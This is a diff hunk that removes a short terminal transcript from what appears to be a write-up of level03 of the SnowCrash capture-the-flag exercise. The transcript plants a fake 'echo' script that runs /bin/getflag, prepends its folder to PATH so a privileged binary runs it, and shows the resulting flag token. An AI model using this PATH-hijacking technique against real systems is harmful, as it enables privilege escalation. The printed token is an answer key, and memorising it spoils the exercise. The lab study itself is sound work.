@@ -1,8 +1,0 @@
-level03@SnowCrash:/tmp/bin$ cat << EOF > /tmp/bin/echo
-> #!/bin/bash
-> /bin/getflag
-> EOF
-level03@SnowCrash:/tmp/bin$ chmod +x /tmp/bin/echo
-level03@SnowCrash:/tmp/bin$ export PATH="/tmp/bin:$PATH"
-level03@SnowCrash:~$ ./level03
-Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
